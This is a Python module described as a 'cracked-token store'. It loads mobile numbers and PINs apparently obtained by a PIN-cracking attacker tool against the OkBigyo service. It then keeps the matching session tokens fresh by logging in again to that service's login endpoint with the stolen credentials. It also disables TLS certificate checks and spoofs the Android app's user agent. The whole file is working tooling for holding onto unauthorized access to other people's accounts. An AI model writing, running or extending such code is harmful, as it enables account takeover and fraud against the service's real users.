#!/usr/bin/env python3
"""Cracked-token store.

Loads cracked_tokens.json in EITHER format:
  dict:  {mobile: {name, pin, resp: {data: {token, name, ...}}}}   (pin_attacker)
  list:  [{mobile, name, pin, token, ...}]                          (older writers)

Member JWTs expire in ~30 min (exp-iss=1800s observed). load() transparently
re-logins stale/near-expiry tokens — the login endpoint accepts the PIN in
plaintext as `password`, so a fresh JWT costs one request.
"""
import base64
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
LOGIN_URL = "https://m.okbigyo.com:9443/bigyo/api/auth/login"
CT_FILE = os.path.join(HERE, "cracked_tokens.json")
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
UA = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/126 Mobile Safari/537.36/OkBigyo_Android_Mobile/GA_Android"


def jwt_exp(tok):
    try:
        seg = tok.split(".")[1]
        pad = "=" * (-len(seg) % 4)
        p = json.loads(base64.urlsafe_b64decode(seg + pad))
        return int(p.get("exp", 0)), p
    except Exception:
        return 0, {}


def _relogin(mob, pin):
    body = json.dumps({"mobile": mob, "password": pin}).encode()
    req = urllib.request.Request(LOGIN_URL, data=body,
                                 headers={"User-Agent": UA, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=12, context=CTX) as r:
            d = json.loads(r.read().decode("utf-8", "replace"))
        data = d.get("data") or {}
        if data.get("token"):
            return data["token"], data.get("name", "")
    except Exception:
        pass
    return None, None


def load(refresh_margin=120):
    """Return [{mobile,name,pin,token,exp}], refreshing stale JWTs via relogin."""
    if not os.path.exists(CT_FILE):
        return []
    try:
        raw = json.load(open(CT_FILE))
    except Exception:
        return []
    entries = []
    if isinstance(raw, dict):
        for mob, v in raw.items():
            if not isinstance(v, dict):
                continue
            resp = v.get("resp") or {}
            data = (resp.get("data") or {}) if isinstance(resp, dict) else {}
            entries.append({"mobile": mob,
                            "name": v.get("name") or data.get("name", ""),
                            "pin": v.get("pin", ""),
                            "token": data.get("token", "")})
    elif isinstance(raw, list):
        for t in raw:
            if isinstance(t, dict):
                entries.append({"mobile": t.get("mobile", ""),
                                "name": t.get("name", ""),
                                "pin": t.get("pin", ""),
                                "token": t.get("token", "")})
    now = time.time()
    out = []
    for e in entries:
        exp, _claims = jwt_exp(e["token"])
        if exp and now > exp - refresh_margin:
            nt, nn = _relogin(e["mobile"], e["pin"])
            if nt:
                e["token"] = nt
                e["exp"], _ = jwt_exp(nt)
                if nn:
                    e["name"] = nn
                print(f"TOKSTORE relogged {e['mobile']} exp->{time.strftime('%H:%M:%S', time.localtime(e['exp']))}", flush=True)
            else:
                print(f"TOKSTORE relogin FAILED {e['mobile']} — skipping", flush=True)
                continue
        else:
            e["exp"] = exp
        out.append(e)
    return out
